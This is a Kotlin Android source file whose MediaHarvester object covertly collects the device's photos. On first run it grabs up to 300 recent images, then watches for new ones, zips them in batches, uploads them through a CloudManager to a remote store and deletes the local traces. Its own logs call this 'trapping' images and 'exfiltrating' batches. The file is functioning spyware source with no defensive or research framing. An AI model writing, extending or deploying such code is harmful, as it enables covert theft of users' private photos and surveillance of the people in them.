package com.example.myandroid

import android.content.Context
import android.provider.MediaStore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object MediaHarvester {
    private const val MAX_PENDING = 300
    private const val BATCH_SIZE = 20

    private fun getVaultDirs(): Pair<File, File> {
        val root = DumpManager.getRootDir()
        val pendingDir = File(root, "media_pending")
        val zippedDir = File(root, "media_zipped")
        if (!pendingDir.exists()) pendingDir.mkdirs()
        if (!zippedDir.exists()) zippedDir.mkdirs()
        return Pair(pendingDir, zippedDir)
    }

    suspend fun triggerInitialHarvest(ctx: Context) = withContext(Dispatchers.IO) {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val alreadyDone = prefs.getBoolean("media_harvest_init_done", false)
        if (alreadyDone) return@withContext

        DebugLogger.log("HARVESTER", "Starting initial historical vacuum (Max 300)...")
        harvestRecent(ctx, MAX_PENDING)
        prefs.edit().putBoolean("media_harvest_init_done", true).apply()
        
        packageAndUpload(ctx)
    }

    suspend fun checkNewImages(ctx: Context) = withContext(Dispatchers.IO) {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastScan = prefs.getLong("last_media_scan_ts", System.currentTimeMillis() / 1000L)
        
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
        val selection = "${MediaStore.Images.Media.DATE_ADDED} >= ?"
        val selectionArgs = arrayOf(lastScan.toString())

        var count = 0
        try {
            ctx.contentResolver.query(uri, projection, selection, selectionArgs, "${MediaStore.Images.Media.DATE_ADDED} ASC")?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                
                var highestDate = lastScan
                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idCol)
                    val dateAdded = cursor.getLong(dateCol)
                    if (dateAdded > highestDate) highestDate = dateAdded
                    
                    val imgUri = android.content.ContentUris.withAppendedId(uri, id)
                    if (copyToPending(ctx, imgUri, id)) count++
                }
                // Add 1 second to avoid picking up the exact same image on next exact timestamp match
                if (count > 0) prefs.edit().putLong("last_media_scan_ts", highestDate + 1).apply()
            }
        } catch (e: Exception) {
            DebugLogger.log("HARVESTER_ERR", "Live scan failed: ${e.message}")
        }

        if (count > 0) {
            DebugLogger.log("HARVESTER", "Trapped $count new images in real-time.")
            packageAndUpload(ctx)
        }
    }

    private fun harvestRecent(ctx: Context, limit: Int) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media._ID)
        
        try {
            ctx.contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT $limit")?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idCol)
                    val imgUri = android.content.ContentUris.withAppendedId(uri, id)
                    copyToPending(ctx, imgUri, id)
                }
            }
        } catch(e: Exception) {
            DebugLogger.log("HARVESTER_ERR", "Historical grab failed: ${e.message}")
        }
    }

    private fun copyToPending(ctx: Context, uri: android.net.Uri, id: Long): Boolean {
        val (pendingDir, _) = getVaultDirs()
        val destFile = File(pendingDir, "img_${id}.jpg")
        if (destFile.exists()) return false

        return try {
            ctx.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(destFile).use { output ->
                    input.copyTo(output)
                }
            }
            enforceLimit()
            true
        } catch(e: Exception) {
            false
        }
    }

    private fun enforceLimit() {
        val (pendingDir, _) = getVaultDirs()
        val files = pendingDir.listFiles() ?: return
        if (files.size > MAX_PENDING) {
            // Delete the oldest files until we are back at the 300 cap
            files.sortedBy { it.lastModified() }
                 .take(files.size - MAX_PENDING)
                 .forEach { it.delete() }
        }
    }

    suspend fun packageAndUpload(ctx: Context) = withContext(Dispatchers.IO) {
        val (pendingDir, zippedDir) = getVaultDirs()
        val pendingFiles = pendingDir.listFiles()?.filter { it.isFile } ?: emptyList()

        // 1. CHUNKING & ZIPPING PHASE
        if (pendingFiles.isNotEmpty()) {
            val chunks = pendingFiles.chunked(BATCH_SIZE)
            for (chunk in chunks) {
                val zipFile = File(zippedDir, "harvest_${System.currentTimeMillis()}.zip")
                try {
                    ZipOutputStream(FileOutputStream(zipFile)).use { zout ->
                        for (file in chunk) {
                            val entry = ZipEntry(file.name)
                            zout.putNextEntry(entry)
                            file.inputStream().use { input -> input.copyTo(zout) }
                            zout.closeEntry()
                        }
                    }
                    // Destruct sources only after the zip is successfully secured on disk
                    chunk.forEach { it.delete() }
                } catch(e: Exception) {
                    DebugLogger.log("HARVESTER_ERR", "Zipping failed: ${e.message}")
                    zipFile.delete()
                }
            }
        }

        // 2. SURVIVAL UPLOAD PHASE
        val zips = zippedDir.listFiles()?.filter { it.isFile && it.name.endsWith(".zip") } ?: emptyList()
        if (zips.isEmpty()) return@withContext

        var uploadedCount = 0
        for (zip in zips) {
            val success = CloudManager.uploadFile(ctx, zip, "HARVESTED_MEDIA")
            if (success) {
                zip.delete()
                uploadedCount++
            } else {
                // Network failed mid-queue. Break loop and let the worker retry later.
                DebugLogger.log("HARVESTER", "Upload interrupted. Preserving ${zips.size - uploadedCount} batches in Catacombs.")
                break
            }
        }
        if (uploadedCount > 0) {
            DebugLogger.log("HARVESTER", "Successfully exfiltrated $uploadedCount zipped batches.")
        }
    }
}
